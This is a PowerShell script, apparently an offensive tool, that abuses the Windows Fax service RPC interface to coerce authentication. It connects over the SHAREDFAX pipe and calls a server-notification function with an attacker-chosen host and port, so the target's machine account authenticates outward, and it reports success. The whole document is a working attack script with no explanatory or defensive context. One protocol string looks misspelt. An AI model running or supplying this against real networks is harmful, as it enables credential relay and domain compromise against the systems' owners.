Import-Module NtObjectManager
Set-GlobalSymbolResolver -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll'

$msfax = Get-RpcServer 'C:\Windows\System32\FXSSVC.exe' | Where-Object { $_.InterfaceId -eq 'ea0a3165-4834-11d2-a6f8-00c04fa346cc' }
$client = Get-RpcClient $msfax

function Coerce-MsFax {
    param(
        [String] $ListeningServer,
        [String] $ListeningTcpPort
    )

    try {
        $stringBinding = Get-RpcStringBinding -ProtocolSequence ncacn_np -Endpoint '\PIPE\SHAREDFAX'
        $securityQos = New-NtSecurityQualityOfService -ImpersonationLevel Identification
        Connect-RpcClient -Client $client -StringBinding $stringBinding  -AuthenticationLevel PacketPrivacy -SecurityQualityOfService $securityQos -AuthenticationType Default
    }
    catch {
        Write-Host '[-] Could not connect to RPC server. Ensure that the Fax service is running'
        return
    }

    $FAX_API_VERSION_3 = 0x00030000
    $result = $client.FAX_ConnectFaxServer($FAX_API_VERSION_3)
    if ($result.retval -eq 0) {
        $connection = $result.p2

        $FAX_EVENT_TYPE_LEGACY = 0
        $result = $client.FAX_StartServerNotificationEx($ListeningServer, $ListeningTcpPort, $context, 'ncan_ip_tcp', $false, $FAX_EVENT_TYPE_LEGACY)
        if ($result.retval -eq 0) {
            Write-Host "[+] Machine account attempted authentication to $ListeningServer\:$ListeningTcpPort"
            $result = $client.FAX_EndServerNotification($result.p6)
        }
        else {
            Write-Host '[-] Could not start server notification.'
        }
        $disconnect = 0
        $result = $client.FAX_ConnectionRefCount($connection, $disconnect)
    }
    else {
        Write-Host '[-] Could not connect to fax server.'
    }
    $client.Disconnect()
}